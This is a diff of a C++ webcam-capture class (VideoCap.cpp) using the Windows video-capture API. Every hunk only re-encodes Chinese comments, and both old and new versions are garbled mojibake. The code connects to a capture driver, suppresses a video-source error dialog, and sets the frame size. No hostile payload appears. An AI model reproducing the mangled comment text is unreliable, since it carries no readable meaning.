@@ -1,4 +1,4 @@
-ï»¿// VideoCap.cpp: implementation of the CVideoCap class.
+// VideoCap.cpp: implementation of the CVideoCap class.
 //
 //////////////////////////////////////////////////////////////////////
 #include "VideoCap.h"
@@ -54,7 +54,7 @@ CVideoCap::~CVideoCap()
 
 	CloseHandle(m_hCaptureEvent);
 }
-// è‡ªå®šä¹‰é”™è¯¯,ä¸è®©å¼¹å‡ºè§†é¢‘æºå¯¹è¯æ¡†
+// ×Ô¶¨Òå´íÎó,²»ÈÃµ¯³öÊÓÆµÔ´¶Ô»°¿ò
 LRESULT CALLBACK CVideoCap::capErrorCallback(HWND hWnd,	int nID, LPCSTR lpsz)
 {
 	return (LRESULT)TRUE;
@@ -76,7 +76,7 @@ LRESULT CALLBACK CVideoCap::FrameCallbackProc(HWND hWnd, LPVIDEOHDR lpVHdr)
 
 bool CVideoCap::IsWebCam()
 {
-	// å·²ç»è¿æ¥äº†
+	// ÒÑ¾­Á¬½ÓÁË
 	if (m_bIsConnected)
 		return false;
 
@@ -104,7 +104,7 @@ LPBYTE CVideoCap::GetDIB()
 
 bool CVideoCap::Initialize(int nWidth, int nHeight)
 {
-	CAPTUREPARMS	gCapTureParms ; //è§†é¢‘é©±åŠ¨å™¨çš„èƒ½åŠ›
+	CAPTUREPARMS	gCapTureParms ; //ÊÓÆµÇı¶¯Æ÷µÄÄÜÁ¦
 	CAPDRIVERCAPS	gCapDriverCaps;
 	DWORD			dwSize;
 
@@ -119,7 +119,7 @@ bool CVideoCap::Initialize(int nWidth, int nHeight)
 		return false;
 	}
 
-	// å°†æ•è·çª—åŒé©±åŠ¨å™¨è¿æ¥
+	// ½«²¶»ñ´°Í¬Çı¶¯Æ÷Á¬½Ó
 	int i = 0;
 	for (i = 0; i < 10; i++)
 	{
@@ -133,16 +133,16 @@ bool CVideoCap::Initialize(int nWidth, int nHeight)
 	dwSize = capGetVideoFormatSize(m_hWndCap);
 	m_lpbmi = new BITMAPINFO;
 
-	// M263åªæ”¯æŒ176*144 352*288 (352*288 24å½©çš„è¯•éªŒåªæ”¯æŒbiPlanes = 1)
+	// M263Ö»Ö§³Ö176*144 352*288 (352*288 24²ÊµÄÊÔÑéÖ»Ö§³ÖbiPlanes = 1)
 	capGetVideoFormat(m_hWndCap, m_lpbmi, dwSize);
-	// é‡‡ç”¨æŒ‡å®šçš„å¤§å°
+	// ²ÉÓÃÖ¸¶¨µÄ´óĞ¡
 	if (nWidth && nHeight)
 	{
  		m_lpbmi->bmiHeader.biWidth = nWidth;
  		m_lpbmi->bmiHeader.biHeight = nHeight;
 		m_lpbmi->bmiHeader.biPlanes = 1;
 		m_lpbmi->bmiHeader.biSizeImage = (((m_lpbmi->bmiHeader.biWidth * m_lpbmi->bmiHeader.biBitCount + 31) & ~31) >> 3) * m_lpbmi->bmiHeader.biHeight;
-		// å®éªŒå¾—çŸ¥ä¸€äº›æ‘„åƒå¤´ä¸æ”¯æŒæŒ‡å®šçš„åˆ†è¾©ç‡
+		// ÊµÑéµÃÖªÒ»Ğ©ÉãÏñÍ·²»Ö§³ÖÖ¸¶¨µÄ·Ö±çÂÊ
  		if (!capSetVideoFormat(m_hWndCap, m_lpbmi, sizeof(BITMAPINFO)))
 			return false;
 	}
